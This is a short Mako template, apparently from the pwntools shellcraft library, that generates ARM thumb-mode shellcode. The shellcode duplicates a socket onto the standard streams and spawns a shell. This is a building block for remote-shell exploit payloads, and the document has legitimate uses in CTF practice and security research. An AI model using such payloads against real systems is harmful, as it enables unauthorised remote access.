<% from pwnlib.shellcraft import arm, common %>
<%page args="sock = None"/>
<%docstring>
	Args: [sock (imm/reg) = None]
	Duplicates sock to stdin, stdout and stderr and spawns a shell in thumb mode.
</%docstring>

${arm.linux.thumb_dup(sock)}
${arm.linux.thumb_sh()}
